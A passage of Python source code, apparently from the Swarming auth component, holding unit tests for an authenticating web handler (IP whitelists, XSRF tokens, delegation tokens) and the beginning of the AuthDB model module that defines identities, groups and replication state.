      @api.public
      def get(self):
        self.response.write(api.get_current_identity().to_bytes())

    app = self.make_test_app('/request', Handler)
    def call(ip):
      api.reset_local_state()
      return app.get('/request', extra_environ={'REMOTE_ADDR': ip}).body

    self.assertEqual('bot:whitelisted-ip', call('192.168.1.100'))
    self.assertEqual('anonymous:anonymous', call('127.0.0.1'))

  def test_ip_whitelist(self):
    """"""Per-account IP whitelist works.""""""
    ident1 = model.Identity(model.IDENTITY_USER, 'a@example.com')
    ident2 = model.Identity(model.IDENTITY_USER, 'b@example.com')

    model.bootstrap_ip_whitelist('whitelist', ['192.168.1.100/32'])
    model.bootstrap_ip_whitelist_assignment(ident1, 'whitelist')

    mocked_ident = [None]

    class Handler(handler.AuthenticatingHandler):
      @classmethod
      def get_auth_methods(cls, conf):
        return [lambda _req: mocked_ident[0]]

      @api.public
      def get(self):
        self.response.write('OK')

    app = self.make_test_app('/request', Handler)
    def call(ident, ip):
      api.reset_local_state()
      mocked_ident[0] = ident
      response = app.get(
          '/request', extra_environ={'REMOTE_ADDR': ip}, expect_errors=True)
      return response.status_int

    # IP is whitelisted.
    self.assertEqual(200, call(ident1, '192.168.1.100'))
    # IP is NOT whitelisted.
    self.assertEqual(403, call(ident1, '127.0.0.1'))
    # Whitelist is not used.
    self.assertEqual(200, call(ident2, '127.0.0.1'))

  def test_auth_method_order(self):
    """"""Registered auth methods are tested in order.""""""
    test = self
    calls = []
    ident = model.Identity(model.IDENTITY_USER, 'joe@example.com')

    def not_applicable(request):
      self.assertEqual('/request', request.path)
      calls.append('not_applicable')
      return None

    def applicable(request):
      self.assertEqual('/request', request.path)
      calls.append('applicable')
      return ident

    class Handler(handler.AuthenticatingHandler):
      @classmethod
      def get_auth_methods(cls, conf):
        return [not_applicable, applicable]

      @api.public
      def get(self):
        test.assertEqual(ident, api.get_current_identity())
        self.response.write('OK')

    app = self.make_test_app('/request', Handler)
    self.assertEqual('OK', app.get('/request').body)

    # Both methods should be tried.
    expected_calls = [
      'not_applicable',
      'applicable',
    ]
    self.assertEqual(expected_calls, calls)

  def test_authentication_error(self):
    """"""AuthenticationError in auth method stops request processing.""""""
    test = self
    calls = []

    def failing(request):
      raise api.AuthenticationError('Too bad')

    def skipped(request):
      self.fail('authenticate should not be called')

    class Handler(handler.AuthenticatingHandler):
      @classmethod
      def get_auth_methods(cls, conf):
        return [failing, skipped]

      @api.public
      def get(self):
        test.fail('Handler code should not be called')

      def authentication_error(self, err):
        test.assertEqual('Too bad', err.message)
        calls.append('authentication_error')
        # pylint: disable=bad-super-call
        super(Handler, self).authentication_error(err)

    app = self.make_test_app('/request', Handler)
    response = app.get('/request', expect_errors=True)

    # Custom error handler is called and returned HTTP 401.
    self.assertEqual(['authentication_error'], calls)
    self.assertEqual(401, response.status_int)

    # Authentication error is logged.
    self.assertEqual(1, len(self.logged_warnings))

  def test_authorization_error(self):
    """"""AuthorizationError in auth method is handled.""""""
    test = self
    calls = []

    class Handler(handler.AuthenticatingHandler):
      @api.require(lambda: False)
      def get(self):
        test.fail('Handler code should not be called')

      def authorization_error(self, err):
        calls.append('authorization_error')
        # pylint: disable=bad-super-call
        super(Handler, self).authorization_error(err)

    app = self.make_test_app('/request', Handler)
    response = app.get('/request', expect_errors=True)

    # Custom error handler is called and returned HTTP 403.
    self.assertEqual(['authorization_error'], calls)
    self.assertEqual(403, response.status_int)

  def make_xsrf_handling_app(
      self,
      xsrf_token_enforce_on=None,
      xsrf_token_header=None,
      xsrf_token_request_param=None):
    """"""Returns webtest app with single XSRF-aware handler.

    If generates XSRF tokens on GET and validates them on POST, PUT, DELETE.
    """"""
    calls = []

    def record(request_handler, method):
      is_valid = request_handler.xsrf_token_data == {'some': 'data'}
      calls.append((method, is_valid))

    class Handler(handler.AuthenticatingHandler):
      @api.public
      def get(self):
        self.response.write(self.generate_xsrf_token({'some': 'data'}))
      @api.public
      def post(self):
        record(self, 'POST')
      @api.public
      def put(self):
        record(self, 'PUT')
      @api.public
      def delete(self):
        record(self, 'DELETE')

    if xsrf_token_enforce_on is not None:
      Handler.xsrf_token_enforce_on = xsrf_token_enforce_on
    if xsrf_token_header is not None:
      Handler.xsrf_token_header = xsrf_token_header
    if xsrf_token_request_param is not None:
      Handler.xsrf_token_request_param = xsrf_token_request_param

    app = self.make_test_app('/request', Handler)
    return app, calls

  def mock_get_current_identity(self, ident):
    """"""Mocks api.get_current_identity() to return |ident|.""""""
    self.mock(handler.api, 'get_current_identity', lambda: ident)

  def test_xsrf_token_get_param(self):
    """"""XSRF token works if put in GET parameters.""""""
    app, calls = self.make_xsrf_handling_app()
    token = app.get('/request').body
    app.post('/request?xsrf_token=%s' % token)
    self.assertEqual([('POST', True)], calls)

  def test_xsrf_token_post_param(self):
    """"""XSRF token works if put in POST parameters.""""""
    app, calls = self.make_xsrf_handling_app()
    token = app.get('/request').body
    app.post('/request', {'xsrf_token': token})
    self.assertEqual([('POST', True)], calls)

  def test_xsrf_token_header(self):
    """"""XSRF token works if put in the headers.""""""
    app, calls = self.make_xsrf_handling_app()
    token = app.get('/request').body
    app.post('/request', headers={'X-XSRF-Token': token})
    self.assertEqual([('POST', True)], calls)

  def test_xsrf_token_missing(self):
    """"""XSRF token is not given but handler requires it.""""""
    app, calls = self.make_xsrf_handling_app()
    response = app.post('/request', expect_errors=True)
    self.assertEqual(403, response.status_int)
    self.assertFalse(calls)

  def test_xsrf_token_uses_enforce_on(self):
    """"""Only methods set in |xsrf_token_enforce_on| require token validation.""""""
    # Validate tokens only on PUT (not on POST).
    app, calls = self.make_xsrf_handling_app(xsrf_token_enforce_on=('PUT',))
    token = app.get('/request').body
    # Both POST and PUT work when token provided, verifying it.
    app.post('/request', {'xsrf_token': token})
    app.put('/request', {'xsrf_token': token})
    self.assertEqual([('POST', True), ('PUT', True)], calls)
    # POST works without a token, put PUT doesn't.
    self.assertEqual(200, app.post('/request').status_int)
    self.assertEqual(403, app.put('/request', expect_errors=True).status_int)
    # Only the one that requires the token fails if wrong token is provided.
    bad_token = {'xsrf_token': 'boo'}
    self.assertEqual(200, app.post('/request', bad_token).status_int)
    self.assertEqual(
        403, app.put('/request', bad_token, expect_errors=True).status_int)

  def test_xsrf_token_uses_xsrf_token_header(self):
    """"""Name of the header used for XSRF can be changed.""""""
    app, calls = self.make_xsrf_handling_app(xsrf_token_header='X-Some')
    token = app.get('/request').body
    app.post('/request', headers={'X-Some': token})
    self.assertEqual([('POST', True)], calls)

  def test_xsrf_token_uses_xsrf_token_request_param(self):
    """"""Name of the request param used for XSRF can be changed.""""""
    app, calls = self.make_xsrf_handling_app(xsrf_token_request_param='tok')
    token = app.get('/request').body
    app.post('/request', {'tok': token})
    self.assertEqual([('POST', True)], calls)

  def test_xsrf_token_identity_matters(self):
    app, calls = self.make_xsrf_handling_app()
    # Generate token for identity A.
    self.mock_get_current_identity(
        model.Identity(model.IDENTITY_USER, 'a@example.com'))
    token = app.get('/request').body
    # Try to use it by identity B.
    self.mock_get_current_identity(
        model.Identity(model.IDENTITY_USER, 'b@example.com'))
    response = app.post('/request', expect_errors=True)
    self.assertEqual(403, response.status_int)
    self.assertFalse(calls)

  def test_get_authenticated_routes(self):
    class Authenticated(handler.AuthenticatingHandler):
      pass

    class NotAuthenticated(webapp2.RequestHandler):
      pass

    app = webapp2.WSGIApplication([
      webapp2.Route('/authenticated', Authenticated),
      webapp2.Route('/not-authenticated', NotAuthenticated),
    ])
    routes = handler.get_authenticated_routes(app)
    self.assertEqual(1, len(routes))
    self.assertEqual(Authenticated, routes[0].handler)

  def test_get_peer_ip(self):
    class Handler(handler.AuthenticatingHandler):
      @api.public
      def get(self):
        self.response.write(ipaddr.ip_to_string(api.get_peer_ip()))

    app = self.make_test_app('/request', Handler)
    response = app.get('/request', extra_environ={'REMOTE_ADDR': '192.1.2.3'})
    self.assertEqual('192.1.2.3', response.body)

  def test_get_peer_host(self):
    class Handler(handler.AuthenticatingHandler):
      @api.public
      def get(self):
        self.response.write(api.get_peer_host() or '<none>')

    app = self.make_test_app('/request', Handler)
    def call(headers):
      api.reset_local_state()
      return app.get('/request', headers=headers).body

    # Good token.
    token = host_token.create_host_token('HOST.domain.com')
    self.assertEqual('host.domain.com', call({'X-Host-Token-V1': token}))

    # Missing or invalid tokens.
    self.assertEqual('<none>', call({}))
    self.assertEqual('<none>', call({'X-Host-Token-V1': 'broken'}))

    # Expired token.
    origin = datetime.datetime(2014, 1, 1, 1, 1, 1)
    self.mock_now(origin)
    token = host_token.create_host_token('HOST.domain.com', expiration_sec=60)
    self.mock_now(origin, 61)
    self.assertEqual('<none>', call({'X-Host-Token-V1': token}))

  def test_delegation_token(self):
    peer_ident = model.Identity.from_bytes('user:peer@a.com')

    class Handler(handler.AuthenticatingHandler):
      @classmethod
      def get_auth_methods(cls, conf):
        return [lambda _request: peer_ident]

      @api.public
      def get(self):
        self.response.write(json.dumps({
          'peer_id': api.get_peer_identity().to_bytes(),
          'cur_id': api.get_current_identity().to_bytes(),
        }))

    app = self.make_test_app('/request', Handler)
    def call(headers=None):
      return json.loads(app.get('/request', headers=headers).body)

    # No delegation.
    self.assertEqual(
        {u'cur_id': u'user:peer@a.com', u'peer_id': u'user:peer@a.com'}, call())

    # TODO(vadimsh): Mint token via some high-level function call.
    subtokens = delegation_pb2.SubtokenList(subtokens=[
        delegation_pb2.Subtoken(
            issuer_id='user:delegated@a.com',
            creation_time=int(utils.time_time()),
            validity_duration=3600),
    ])
    tok = delegation.serialize_token(delegation.seal_token(subtokens))

    # With valid delegation token.
    self.assertEqual(
        {u'cur_id': u'user:delegated@a.com', u'peer_id': u'user:peer@a.com'},
        call({'X-Delegation-Token-V1': tok}))

    # With invalid delegation token.
    r = app.get(
        '/request',
        headers={'X-Delegation-Token-V1': tok + 'blah'},
        expect_errors=True)
    self.assertEqual(403, r.status_int)

    # Transient error.
    def mocked_check(*_args):
      raise delegation.TransientError('Blah')
    self.mock(delegation, 'check_delegation_token', mocked_check)
    r = app.get(
        '/request',
        headers={'X-Delegation-Token-V1': tok},
        expect_errors=True)
    self.assertEqual(500, r.status_int)


class GaeCookieAuthenticationTest(test_case.TestCase):
  """"""Tests for gae_cookie_authentication function.""""""

  def test_non_applicable(self):
    self.assertIsNone(handler.gae_cookie_authentication(webapp2.Request({})))

  def test_applicable(self):
    os.environ.update({
      'USER_EMAIL': 'joe@example.com',
      'USER_ID': '123',
      'USER_IS_ADMIN': '0',
    })
    # Actual request is not used by CookieAuthentication.
    self.assertEqual(
        model.Identity(model.IDENTITY_USER, 'joe@example.com'),
        handler.gae_cookie_authentication(webapp2.Request({})))


class ServiceToServiceAuthenticationTest(test_case.TestCase):
  """"""Tests for service_to_service_authentication.""""""

  def test_non_applicable(self):
    request = webapp2.Request({})
    self.assertIsNone(
        handler.service_to_service_authentication(request))

  def test_applicable(self):
    request = webapp2.Request({
      'HTTP_X_APPENGINE_INBOUND_APPID': 'some-app',
    })
    self.assertEqual(
      model.Identity(model.IDENTITY_SERVICE, 'some-app'),
      handler.service_to_service_authentication(request))


if __name__ == '__main__':
  if '-v' in sys.argv:
    unittest.TestCase.maxDiff = None
  unittest.main()
/n/n/nappengine/components/components/auth/model.py/n/n# Copyright 2014 The Swarming Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""NDB model classes used to model AuthDB relations.

Overview
--------

Models defined here are used by central authentication service (that stores all
groups and secrets) and by services that implement some concrete functionality
protected with ACLs (like isolate and swarming services).

Applications that use auth component may work in 3 modes:
  1. Standalone. Application is self contained and manages its own groups.
     Useful when developing a new service or for simple installations.
  2. Replica. Application uses a central authentication service. An application
     can be dynamically switched from Standalone to Replica mode.
  3. Primary. Application IS a central authentication service. Only 'auth'
     service is running in this mode. 'configure_as_primary' call during startup
     switches application to that mode.

Central authentication service (Primary) holds authoritative copy of all auth
related information (groups, secrets, etc.) and acts as a single source of truth
for it. All other services (Replicas) hold copies of a relevant subset of
this information (that they use to perform authorization checks).

Primary service is responsible for updating replicas' configuration via
service-to-service push based replication protocol.

AuthDB holds a list of groups. Each group has a unique name and is defined
as union of 3 sets:
  1) Explicit enumeration of particular Identities e.g. 'user:alice@example.com'
  2) Set of glob-like identity patterns e.g. 'user:*@example.com'
  3) Set of nested Groups.

Identity defines an actor making an action (it can be a real person, a bot,
an AppEngine application or special 'anonymous' identity).

In addition to that, AuthDB stores small amount of authentication related
configuration data, such as OAuth2 client_id and client_secret and various
secret keys.

Audit trail
-----------

Each change to AuthDB has an associated revision number (that monotonically
increases with each change). All entities modified by a change are copied to
append-only log under an entity key associated with the revision (see
historical_revision_key below). Removals are marked by special auth_db_deleted
flag in entites in the log. This is enough to recover a snapshot of all groups
at some specific moment in time, or to produce a diff between two revisions.

Note that entities in the historical log are not used by online queries. At any
moment in time most recent version of an AuthDB entity exists in two copies:
  1) Main copy used for online queries. It is mutated in-place with each change.
  2) Most recent record in the historical log. Read only.

To reduce a possibility of misuse of historical copies in online transactions,
history log entity classes are suffixied with 'History' suffix. They also have
all indexes stripped.

This mechanism is enabled only on services in Standalone or Primary mode.
Replicas do not keep track of AuthDB revisions and do not keep any historical
log.
""""""

import collections
import fnmatch
import logging
import os
import re

from google.appengine.api import app_identity
from google.appengine.ext import ndb

from components import datastore_utils
from components import utils

from . import ipaddr

# Part of public API of 'auth' component, exposed by this module.
__all__ = [
  'ADMIN_GROUP',
  'Anonymous',
  'bootstrap_group',
  'bootstrap_ip_whitelist',
  'bootstrap_loopback_ips',
  'BOTS_IP_WHITELIST',
  'configure_as_primary',
  'find_group_dependency_cycle',
  'find_referencing_groups',
  'get_auth_db_revision',
  'get_missing_groups',
  'get_service_self_identity',
  'group_key',
  'Identity',
  'IDENTITY_ANONYMOUS',
  'IDENTITY_BOT',
  'IDENTITY_SERVICE',
  'IDENTITY_USER',
  'IdentityGlob',
  'IdentityProperty',
  'ip_whitelist_key',
  'is_empty_group',
  'is_external_group_name',
  'is_primary',
  'is_replica',
  'is_standalone',
  'is_valid_group_name',
  'is_valid_ip_whitelist_name',
  'replicate_auth_db',
]


# Name of a group whose members have access to Group management UI. It's the
# only group needed to bootstrap everything else.
ADMIN_GROUP = 'administrators'

# Name of AuthIPWhitelist with bots IP ranges. See AuthIPWhitelist.
BOTS_IP_WHITELIST = 'bots'

# No identity information is provided. Identity name is always 'anonymous'.
IDENTITY_ANONYMOUS = 'anonymous'
# Using bot credentials. Identity name is bot's id.
IDENTITY_BOT = 'bot'
# Using App Engine service credentials. Identity name is app name.
IDENTITY_SERVICE = 'service'
# Using user credentials. Identity name is user's email.
IDENTITY_USER = 'user'

# All allowed identity kinds + regexps to validate identity name.
ALLOWED_IDENTITY_KINDS = {
  IDENTITY_ANONYMOUS: re.compile(r'^anonymous$'),
  IDENTITY_BOT: re.compile(r'^[0-9a-zA-Z_\-\.@]+$'),
  IDENTITY_SERVICE: re.compile(r'^[0-9a-zA-Z_\-\:\.]+$'),
  IDENTITY_USER: re.compile(r'^[0-9a-zA-Z_\-\.\+]+@[0-9a-z_\-\.]+$'),
}

# Regular expression that matches group names. ASCII only, no leading or
# trailing spaces allowed (spaces inside are fine).
GROUP_NAME_RE = re.compile(
    r'^([a-z\-]+/)?[0-9a-zA-Z_][0-9a-zA-Z_\-\.\ ]{1,80}[0-9a-zA-Z_\-\.]$')
# Special group name that means 'All possible users' (including anonymous!).
GROUP_ALL = '*'

# Regular expression for IP whitelist name.
IP_WHITELIST_NAME_RE = re.compile(r'^[0-9a-zA-Z_\-\+\.\ ]{2,200}$')


# Configuration of Primary service, set by 'configure_as_primary'.
_replication_callback = None


# Root ndb keys of various models. They can't be defined as a module level
# constants because ndb.Key implicitly includes current APPLICATION_ID. And in
# testing environment it is '_' during module loading time. Trying to use such
# key from within a testbed test case results in the following error:
# BadRequestError: app ""testbed-test"" cannot access app ""_""'s data


def root_key():
  """"""Global root key of auth models entity group.""""""
  return ndb.Key('AuthGlobalConfig', 'root')


def replication_state_key():
  """"""Key of AuthReplicationState entity.""""""
  return ndb.Key('AuthReplicationState', 'self', parent=root_key())


def ip_whitelist_assignments_key():
  """"""Key of AuthIPWhitelistAssignments entity.""""""
  return ndb.Key('AuthIPWhitelistAssignments', 'default', parent=root_key())


def historical_revision_key(auth_db_rev):
  """"""Key for entity subgroup that holds changes done in a concrete revision.""""""
  return ndb.Key('Rev', auth_db_rev, parent=root_key())


################################################################################
## Identity & IdentityGlob.


class Identity(
    datastore_utils.BytesSerializable,
    collections.namedtuple('Identity', 'kind, name')):
  """"""Represents a caller that makes requests. Immutable.

  A tuple of (kind, name) where 'kind' is one of IDENTITY_* constants and
  meaning of 'name' depends on a kind (see comments for IDENTITY_*).
  It generalizes accounts of real people, bot accounts and service-to-service
  accounts.

  It's a pure identity information. Any additional information that may be
  related to an identity (e.g. registration date, last access time, etc.) should
  be stored elsewhere using Identity.to_bytes() as a key.
  """"""

  # Inheriting from tuple requires use of __new__ instead of __init__. __init__
  # is called with object already 'frozen', so it's not possible to modify its
  # attributes in __init__.
  # See http://docs.python.org/2/reference/datamodel.html#object.__new__
  def __new__(cls, kind, name):
    if isinstance(name, unicode):
      try:
        name = name.encode('ascii')
      except UnicodeEncodeError:
        raise ValueError('Identity has invalid format: only ASCII is allowed')
    if (kind not in ALLOWED_IDENTITY_KINDS or
        not ALLOWED_IDENTITY_KINDS[kind].match(name)):
      raise ValueError('Identity has invalid format: %s' % name)
    return super(Identity, cls).__new__(cls, str(kind), name)

  def to_bytes(self):
    """"""Serializes this identity to byte buffer.""""""
    return '%s:%s' % (self.kind, self.name)

  @classmethod
  def from_bytes(cls, byte_buf):
    """"""Given a byte buffer returns corresponding Identity object.""""""
    kind, sep, name = byte_buf.partition(':')
    if not sep:
      raise ValueError('Missing \':\' separator in Identity string')
    return cls(kind, name)

  @property
  def is_anonymous(self):
    """"""True if this object represents anonymous identity.""""""
    return self.kind == IDENTITY_ANONYMOUS

  @property
  def is_bot(self):
    """"""True if this object represents bot account.""""""
    return self.kind == IDENTITY_BOT

  @property
  def is_service(self):
    """"""True if this object represents service account.""""""
    return self.kind == IDENTITY_SERVICE

  @property
  def is_user(self):
    """"""True if this object represents user account.""""""
    return self.kind == IDENTITY_USER


# Predefined Anonymous identity.
Anonymous = Identity(IDENTITY_ANONYMOUS, 'anonymous')


class IdentityProperty(datastore_utils.BytesSerializableProperty):
  """"""NDB model property for Identity values.

  Identities are stored as indexed short blobs internally.
  """"""
  _value_type = Identity
  _indexed = True


class IdentityGlob(
    datastore_utils.BytesSerializable,
    collections.namedtuple('IdentityGlob', 'kind, pattern')):
  """"""Glob-like pattern that matches subset of identities. Immutable.

  Tuple (kind, glob) where 'kind' is is one of IDENTITY_* constants and 'glob'
  defines pattern that identity names' should match. For example, IdentityGlob
  that matches all bots is (IDENTITY_BOT, '*') which is also can be written
  as 'bot:*'.
  """"""

  # See comment for Identity.__new__ regarding use of __new__ here.
  def __new__(cls, kind, pattern):
    if isinstance(pattern, unicode):
      try:
        pattern = pattern.encode('ascii')
      except UnicodeEncodeError:
        raise ValueError('Invalid IdentityGlob pattern: only ASCII is allowed')
    if not pattern:
      raise ValueError('No pattern is given')
    if kind not in ALLOWED_IDENTITY_KINDS:
      raise ValueError('Invalid Identity kind: %s' % kind)
    return super(IdentityGlob, cls).__new__(cls, str(kind), pattern)

  def to_bytes(self):
    """"""Serializes this identity glob to byte buffer.""""""
    return '%s:%s' % (self.kind, self.pattern)

  @classmethod
  def from_bytes(cls, byte_buf):
    """"""Given a byte buffer returns corresponding IdentityGlob object.""""""
    kind, sep, pattern = byte_buf.partition(':')
    if not sep:
      raise ValueError('Missing \':\' separator in IdentityGlob string')
    return cls(kind, pattern)

  def match(self, identity):
    """"""Return True if |identity| matches this pattern.""""""
    if identity.kind != self.kind:
      return False
    return fnmatch.fnmatchcase(identity.name, self.pattern)


class IdentityGlobProperty(datastore_utils.BytesSerializableProperty):
  """"""NDB model property for IdentityGlob values.

  IdentityGlobs are stored as short indexed blobs internally.
  """"""
  _value_type = IdentityGlob
  _indexed = True


################################################################################
## Singleton entities and replication related models.


def configure_as_primary(replication_callback):
  """"""Registers a callback to be called when AuthDB changes.

  Should be called during Primary application startup. The callback will be
  called as 'replication_callback(AuthReplicationState)' from inside transaction
  on root_key() entity group whenever replicate_auth_db() is called (i.e. on
  every change to auth db that should be replication to replicas).
  """"""
  global _replication_callback
  _replication_callback = replication_callback


def is_primary():
  """"""Returns True if current application was configured as Primary.""""""
  return bool(_replication_callback)


def is_replica():
  """"""Returns True if application is in Replica mode.""""""
  return not is_primary() and not is_standalone()


def is_standalone():
  """"""Returns True if application is in Standalone mode.""""""
  ent = get_replication_state()
  return not ent or not ent.primary_id


def get_replication_state():
  """"""Returns AuthReplicationState singleton entity if it exists.""""""
  return replication_state_key().get()


def get_auth_db_revision():
  """"""Returns current revision of AuthDB, it increases with each change.""""""
  state = get_replication_state()
  return state.auth_db_rev if state else 0


def get_service_self_identity():
  """"""Returns Identity that correspond to the current GAE app itself.""""""
  return Identity(IDENTITY_SERVICE, app_identity.get_application_id())


class AuthVersionedEntityMixin(object):
  """"""Mixin class for entities that keep track of when they change.

  Entities that have this mixin are supposed to be updated in get()\put() or
  get()\delete() transactions. Caller must call record_revision(...) sometime
  during the transaction (but before put()). Similarly a call to
  record_deletion(...) is expected sometime before delete().

  replicate_auth_db will store a copy of the entity in the revision log when
  committing a transaction.

  A pair of properties auth_db_rev and auth_db_prev_rev are used to implement
  a linked list of versions of this entity (e.g. one can take most recent entity
  version and go back in time by following auth_db_prev_rev links).
  """"""
  # When the entity was modified last time. Do not use 'auto_now' property since
  # such property overrides any explicitly set value with now() during put. It's
  # undesired when storing a copy of entity received from Primary (Replica
  # should have modified_ts to be same as on Primary).
  modified_ts = ndb.DateTimeProperty()
  # Who modified the entity last time.
  modified_by = IdentityProperty()

  # Revision of Auth DB at which this entity was updated last time.
  auth_db_rev = ndb.IntegerProperty()
  # Revision of Auth DB of previous version of this entity or None.
  auth_db_prev_rev = ndb.IntegerProperty()

  def record_revision(self, modified_by, modified_ts=None, comment=None):
    """"""Updates the entity to record Auth DB revision of the current transaction.

    Stages the entity to be copied to historical log.

    Must be called sometime before 'put' (not necessary right before it). Note
    that NDB hooks are not used because they are buggy. See docstring for
    replicate_auth_db for more info.

    Args:
      modified_by: Identity that made the change.
      modified_ts: datetime when the change was made (or None for current time).
      comment: optional comment to put in the revision log.
    """"""
    _get_pending_auth_db_transaction().record_change(
        entity=self,
        deletion=False,
        modified_by=modified_by,
        modified_ts=modified_ts or utils.utcnow(),
        comment=comment)

  def record_deletion(self, modified_by, modified_ts=None, comment=None):
    """"""Marks entity as being deleted in the current transaction.

    Stages the entity to be copied to historical log (with 'auth_db_deleted'
    flag set). The entity must not be mutated between 'get' and AuthDB commit.

    Must be called sometime before 'delete' (not necessary right before it).
    Note that NDB hooks are not used because they are buggy. See docstring for
    replicate_auth_db for more info.

    Args:
      modified_by: Identity that made the change.
      modified_ts: datetime when the change was made (or None for current time).
      comment: optional comment to put in the revision log.
    """"""
    _get_pending_auth_db_transaction().record_change(
        entity=self,
        deletion=True,
        modified_by=modified_by,
        modified_ts=modified_ts or utils.utcnow(),
        comment=comment)

  ## Internal interface. Do not use directly unless you know what you are doing.

  @classmethod
  def get_historical_copy_class(cls):
    """"""Returns entity class for historical copies of original entity.

    Has all the same properties, but unindexed (not needed), unvalidated
    (original entity is already validated) and not cached.

    The name of the new entity class is ""<original name>History"" (to make sure
    it doesn't show up in indexes for original entity class).
    """"""
    existing = getattr(cls, '_auth_db_historical_copy_cls', None)
    if existing:
      return existing
    props = {}
    for name, prop in cls._properties.iteritems():
      # Whitelist supported property classes. Better to fail loudly when
      # encountering something new, rather than silently produce (possibly)
      # incorrect result. Note that all AuthDB classes are instantiated in
      # unit tests, so there should be no unexpected asserts in production.
      assert prop.__class__ in (
        IdentityGlobProperty,
        IdentityProperty,
        ndb.BlobProperty,
        ndb.BooleanProperty,
        ndb.DateTimeProperty,
        ndb.IntegerProperty,
        ndb.LocalStructuredProperty,
        ndb.StringProperty,
        ndb.TextProperty,
      ), prop.__class__
      kwargs = {
        'name': prop._name,
        'indexed': False,
        'required': False,
        'repeated': prop._repeated,
      }
      if prop.__class__ == ndb.LocalStructuredProperty:
        kwargs['modelclass'] = prop._modelclass
      props[name] = prop.__class__(**kwargs)
    new_cls = type(
        '%sHistory' % cls.__name__, (_AuthDBHistoricalEntity,), props)
    cls._auth_db_historical_copy_cls = new_cls
    return new_cls

  def make_historical_copy(self, deleted, comment):
    """"""Returns an entity to put in the historical log.

    It's a copy of the original entity, but stored under another key and with
    indexes removed. It also has a bunch of additional properties (defined
    in _AuthDBHistoricalEntity). See 'get_historical_copy_class'.

    The key is derived from auth_db_rev and class and ID of the original entity.
    For example, AuthGroup ""admins"" modified at rev 123 will be copied to
    the history as ('AuthGlobalConfig', 'root', 'Rev', 123, 'AuthGroupHistory',
    'admins'), where the key prefix (first two pairs) is obtained with
    historical_revision_key(...).
    """"""
    assert self.key.parent() == root_key() or self.key == root_key(), self.key
    cls = self.get_historical_copy_class()
    entity = cls(
        id=self.key.id(),
        parent=historical_revision_key(self.auth_db_rev))
    for prop in self._properties:
      setattr(entity, prop, getattr(self, prop))
    entity.auth_db_deleted = deleted
    entity.auth_db_change_comment = comment
    entity.auth_db_app_version = utils.get_app_version()
    return entity


class AuthGlobalConfig(ndb.Model, AuthVersionedEntityMixin):
  """"""Acts as a root entity for auth models.

  There should be only one instance of this model in Datastore, with a key set
  to root_key(). A change to an entity group rooted at this key is a signal that
  AuthDB has to be refetched (see 'fetch_auth_db' in api.py).

  Entities that change often or associated with particular bot or user
  MUST NOT be in this entity group.

  Content of this particular entity is replicated from Primary service to all
  Replicas.

  Entities that belong to this entity group are:
   * AuthGroup
   * AuthIPWhitelist
   * AuthIPWhitelistAssignments
   * AuthReplicationState
   * AuthSecret
  """"""
  # OAuth2 client_id to use to mint new OAuth2 tokens.
  oauth_client_id = ndb.StringProperty(indexed=False, default='')
  # OAuth2 client secret. Not so secret really, since it's passed to clients.
  oauth_client_secret = ndb.StringProperty(indexed=False, default='')
  # Additional OAuth2 client_ids allowed to access the services.
  oauth_additional_client_ids = ndb.StringProperty(repeated=True, indexed=False)


class AuthReplicationState(ndb.Model, datastore_utils.SerializableModelMixin):
  """"""Contains state used to control Primary -> Replica replication.

  It's a singleton entity with key replication_state_key() (in same entity
  groups as root_key()). This entity should be small since it is updated
  (auth_db_rev is incremented) whenever AuthDB changes.

  Exists in any AuthDB (on Primary and Replicas). Primary updates it whenever
  changes to AuthDB are made, Replica updates it whenever it receives a push
  from Primary.
  """"""
  # How to convert this entity to or from serializable dict.
  serializable_properties = {
    'primary_id': datastore_utils.READABLE,
    'primary_url': datastore_utils.READABLE,
    'auth_db_rev': datastore_utils.READABLE,
    'modified_ts': datastore_utils.READABLE,
  }

  # For services in Standalone mode it is None.
  # For services in Primary mode: own GAE application ID.
  # For services in Replica mode it is a GAE application ID of Primary.
  primary_id = ndb.StringProperty(indexed=False)

  # For services in Replica mode, root URL of Primary, i.e https://<host>.
  primary_url = ndb.StringProperty(indexed=False)

  # Revision of auth DB. Increased by 1 with every change that should be
  # propagate to replicas. Only services in Standalone or Primary mode
  # update this property by themselves. Replicas receive it from Primary.
  auth_db_rev = ndb.IntegerProperty(default=0, indexed=False)

  # Time when auth_db_rev was created (by Primary clock). For informational
  # purposes only. See comment at AuthGroup.modified_ts for explanation why
  # auto_now is not used.
  modified_ts = ndb.DateTimeProperty(auto_now_add=True, indexed=False)


def replicate_auth_db():
  """"""Increments auth_db_rev, updates historical log, triggers replication.

  Must be called once from inside a transaction (right before exiting it).

  Should only be called for services in Standalone or Primary modes. Will raise
  ValueError if called on Replica. When called for service in Standalone mode,
  will update auth_db_rev but won't kick any replication. For services in
  Primary mode will also initiate replication by calling callback set in
  'configure_as_primary'. The callback usually transactionally enqueues a task
  (to gracefully handle transaction rollbacks).

  WARNING: This function relies on a valid transaction context. NDB hooks and
  asynchronous operations are known to be buggy in this regard: NDB hook for
  an async operation in a transaction may be called with a wrong context
  (main event loop context instead of transaction context). One way to work
  around that is to monkey patch NDB (as done here: https://goo.gl/1yASjL).
  Another is to not use hooks at all. There's no way to differentiate between
  sync and async modes of an NDB operation from inside a hook. And without a
  strict assert it's very easy to forget about ""Do not use put_async"" warning.
  For that reason _post_put_hook is NOT used and replicate_auth_db() should be
  called explicitly whenever relevant part of root_key() entity group is
  updated.

  Returns:
    New AuthDB revision number.
  """"""
  assert ndb.in_transaction()
  txn = _get_pending_auth_db_transaction()
  txn.commit()
  if is_primary():
    _replication_callback(txn.replication_state)
  return txn.replication_state.auth_db_rev


################################################################################
## Auth DB transaction details (used for historical log of changes).


_commit_callbacks = []


def commit_callback(cb):
  """"""Adds a callback that's called before AuthDB transaction is committed.

  Can be used as decorator. Adding a callback second time is noop.

  Args:
    cb: function that takes single auth_db_rev argument as input.
  """"""
  if cb not in _commit_callbacks:
    _commit_callbacks.append(cb)
  return cb


def _get_pending_auth_db_transaction():
  """"""Used internally to keep track of changes done in the transaction.

  Returns:
    Instance of _AuthDBTransaction (stored in the transaction context).
  """"""
  # Use transaction context to store the object. Note that each transaction
  # retry gets its own new transaction context which is what we need,
  # see ndb/context.py, 'transaction' tasklet, around line 982 (for SDK 1.9.6).
  assert ndb.in_transaction()
  ctx = ndb.get_context()
  txn = getattr(ctx, '_auth_db_transaction', None)
  if txn:
    return txn

  # Prepare next AuthReplicationState (auth_db_rev +1).
  state = replication_state_key().get()
  if not state:
    primary_id = app_identity.get_application_id() if is_primary() else None
    state = AuthReplicationState(
        key=replication_state_key(),
        primary_id=primary_id,
